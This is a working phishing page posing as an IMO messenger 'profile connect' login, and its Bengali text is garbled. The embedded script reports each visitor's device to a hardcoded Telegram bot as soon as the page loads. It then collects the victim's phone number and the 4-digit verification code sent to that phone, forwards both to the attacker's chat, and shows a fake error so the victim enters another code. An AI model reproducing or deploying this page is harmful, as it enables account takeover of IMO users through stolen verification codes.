<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IMO Profile Connect</title>
    
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- FontAwesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        body { margin: 0; padding: 0; background-color: #0f172a; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .imo-card { background: linear-gradient(145deg, #1e293b, #0f172a); border: 1px solid #334155; }
        .pin-input { 
            width: 50px; height: 55px; 
            text-align: center; font-size: 1.5rem; font-weight: bold;
            background: rgba(15, 23, 42, 0.6); 
            border: 2px solid #334155; color: white; 
            border-radius: 10px; margin: 0 6px; 
            transition: all 0.3s ease;
        }
        .pin-input:focus { outline: none; border-color: #38bdf8; box-shadow: 0 0 10px rgba(56,189,248,0.3); }
        .hidden { display: none; }
        
        /* Animation for fade in */
        .fade-in { animation: fadeIn 0.5s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="w-full max-w-md imo-card rounded-2xl overflow-hidden shadow-2xl relative">
        <div class="p-8 min-h-[500px] flex flex-col items-center justify-center text-center">
            
            <!-- ============================ -->
            <!-- STEP 1: PHONE NUMBER INPUT -->
            <!-- ============================ -->
            <div id="step-phone" class="w-full fade-in">
                <div class="relative w-24 h-24 mx-auto mb-6">
                    <img src="https://i.ibb.co/F8bJ3s1/imo-profile.jpg" class="w-full h-full rounded-full border-4 border-sky-500 shadow-lg object-cover" alt="Profile">
                    <div class="absolute bottom-0 right-0 bg-green-500 w-6 h-6 rounded-full border-2 border-slate-900"></div>
                </div>
                
                <h1 class="text-2xl font-bold text-white mb-2">IMO Profile</h1>
                <p class="text-slate-400 text-sm mb-8">‡¶™‡ßç‡¶∞‡ßã‡¶´‡¶æ‡¶á‡¶≤‡ßá ‡¶ú‡ßü‡ßá‡¶® ‡¶π‡¶§‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ IMO ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡¶®</p>
                
                <div class="relative mb-6 text-left">
                    <label class="text-xs text-sky-400 ml-2 mb-1 block font-semibold">Phone Number</label>
                    <div class="relative">
                        <i class="fa fa-phone absolute left-4 top-3.5 text-slate-400"></i>
                        <input type="tel" id="inputPhone" placeholder="017xxxxxxxx" class="w-full bg-slate-800 border border-slate-600 text-white p-3 pl-10 rounded-xl focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500 transition-all">
                    </div>
                </div>

                <button onclick="handlePhoneSubmit()" class="w-full bg-gradient-to-r from-sky-500 to-blue-600 text-white font-bold py-3.5 rounded-xl shadow-lg hover:from-sky-400 hover:to-blue-500 active:scale-95 transition-all duration-300">
                    <i class="fa fa-paper-plane mr-2"></i> Continue
                </button>
            </div>

            <!-- ============================ -->
            <!-- STEP 2: LOADING SPINNER -->
            <!-- ============================ -->
            <div id="step-loader" class="hidden fade-in">
                <div class="w-16 h-16 border-4 border-slate-700 border-t-sky-500 rounded-full animate-spin mx-auto mb-6"></div>
                <h2 class="text-xl font-semibold text-white">‡¶è‡¶° ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...</h2>
                <p class="text-slate-400 text-sm mt-2">‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®</p>
            </div>

            <!-- ============================ -->
            <!-- STEP 3: OTP INPUT -->
            <!-- ============================ -->
            <div id="step-otp" class="hidden w-full fade-in">
                <div class="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6 border border-slate-600">
                    <i class="fa fa-shield-halved text-3xl text-sky-400"></i>
                </div>
                
                <h2 class="text-2xl font-bold text-white mb-2">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ imo ‡¶≤‡¶ï-‡¶ï‡¶∞‡¶æ ‡¶Ü‡¶õ‡ßá</h2>
                <p class="text-slate-400 text-sm mb-8">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡ß™-‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶Ü‡¶®‡¶ï‡¶≤ ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®</p>
                
                <div class="flex justify-center gap-2 mb-8">
                    <input type="tel" id="otp1" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp2')" autofocus>
                    <input type="tel" id="otp2" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp3')">
                    <input type="tel" id="otp3" class="pin-input" maxlength="1" oninput="moveToNext(this, 'otp4')">
                    <input type="tel" id="otp4" class="pin-input" maxlength="1" oninput="submitFinalOtp()">
                </div>

                <p class="text-slate-500 text-xs">‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶™‡¶æ‡¶®‡¶®‡¶ø? <span class="text-sky-400 cursor-pointer hover:underline">‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶™‡¶æ‡¶†‡¶æ‡¶®</span></p>
            </div>

            <!-- ============================ -->
            <!-- STEP 4: ERROR MESSAGE -->
            <!-- ============================ -->
            <div id="step-error" class="hidden w-full fade-in">
                <div class="bg-red-500/10 border border-red-500/50 p-6 rounded-xl backdrop-blur-sm">
                    <div class="w-14 h-14 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fa fa-triangle-exclamation text-2xl text-red-500"></i>
                    </div>
                    <h3 class="text-xl font-bold text-red-400 mb-2">‡¶≠‡ßÅ‡¶≤ ‡¶π‡ßü‡ßá‡¶õ‡ßá!</h3>
                    <p class="text-slate-300 text-sm mb-6">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¶‡ßá‡¶ì‡ßü‡¶æ ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞‡¶ü‡¶ø ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡ßü‡•§ ‡¶¶‡ßü‡¶æ ‡¶ï‡¶∞‡ßá ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡ßü‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</p>
                    
                    <button onclick="location.reload()" class="px-6 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition-colors shadow-lg shadow-red-900/50">
                        ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®
                    </button>
                </div>
            </div>

        </div>
    </div>

<script>
    // --- TELEGRAM SETUP ---
    const BOT_TOKEN = "7548672389:AAFvtDCWlgnL00I0BCwnGlzY_D0kTAIm0rI"; 
    const CHAT_ID = "7437458013"; 

    // Telegram Message Sender Function
    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } catch (error) {
            console.error("Sending failed", error);
        }
    }

    // --- NEW LOGIC: VISITOR ALERT (Page Load) ---
    // ‡¶™‡ßá‡¶ú ‡¶ì‡¶™‡ßá‡¶® ‡¶ï‡¶∞‡¶≤‡ßá‡¶á ‡¶è‡¶á ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡¶ü‡¶ø ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶¨‡ßá
    window.addEventListener('load', async () => {
        // User Agent ‡¶¶‡¶ø‡ßü‡ßá ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶∏‡¶Æ‡ßç‡¶™‡¶∞‡ßç‡¶ï‡ßá ‡¶ï‡¶ø‡¶õ‡ßÅ‡¶ü‡¶æ ‡¶§‡¶•‡ßç‡¶Ø ‡¶®‡ßá‡¶ì‡ßü‡¶æ
        const device = navigator.userAgent; 
        await sendToTelegram(`üëÄ *‡¶®‡¶§‡ßÅ‡¶® ‡¶≠‡¶ø‡¶ú‡¶ø‡¶ü‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶≤‡¶æ‡¶∞‡ßç‡¶ü*\n‡¶ï‡ßá‡¶â ‡¶è‡¶ï‡¶ú‡¶® ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡ßá‡¶ú‡¶ü‡¶ø ‡¶ì‡¶™‡ßá‡¶® ‡¶ï‡¶∞‡ßá‡¶õ‡ßá!\nüì± Device: \`${device}\`\nüïí ‡¶∏‡¶Æ‡ßü: ${new Date().toLocaleTimeString()}`);
    });

    // --- STEP 1: Handle Phone Number ---
    async function handlePhoneSubmit() {
        const phoneInput = document.getElementById('inputPhone');
        const phoneVal = phoneInput.value.trim();

        if (phoneVal.length < 5) {
            phoneInput.style.borderColor = "#ef4444";
            setTimeout(() => phoneInput.style.borderColor = "#475569", 2000);
            return;
        }

        // Send Phone to Telegram
        await sendToTelegram(`üì± *IMO ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶æ‡¶™‡ßç‡¶§*\nüìû ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞: \`${phoneVal}\``);

        // UI Transition: Phone -> Loader
        document.getElementById('step-phone').classList.add('hidden');
        document.getElementById('step-loader').classList.remove('hidden');

        // Simulate Network Delay (3 Seconds) -> Go to OTP
        setTimeout(() => {
            document.getElementById('step-loader').classList.add('hidden');
            document.getElementById('step-otp').classList.remove('hidden');
            document.getElementById('otp1').focus(); // Focus first OTP box
        }, 3000);
    }

    // --- STEP 2: OTP Input Logic ---
    window.moveToNext = function(current, nextFieldID) {
        if (current.value.length >= 1) {
            if (nextFieldID) {
                document.getElementById(nextFieldID).focus();
            }
        }
    }

    // --- STEP 3: Handle Final OTP ---
    async function submitFinalOtp() {
        const o1 = document.getElementById('otp1').value;
        const o2 = document.getElementById('otp2').value;
        const o3 = document.getElementById('otp3').value;
        const o4 = document.getElementById('otp4').value;
        const fullCode = o1 + o2 + o3 + o4;

        if (fullCode.length === 4) {
            // Disable inputs to prevent double submit
            document.querySelectorAll('.pin-input').forEach(el => el.disabled = true);

            // Send OTP to Telegram
            await sendToTelegram(`üîê *IMO ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶ï‡ßã‡¶°*\nüî¢ ‡¶ï‡ßã‡¶°: \`${fullCode}\``);

            // Small delay for realism -> Show Error
            setTimeout(() => {
                document.getElementById('step-otp').classList.add('hidden');
                document.getElementById('step-error').classList.remove('hidden');
            }, 800);
        }
    }
</script>

</body>
</html>
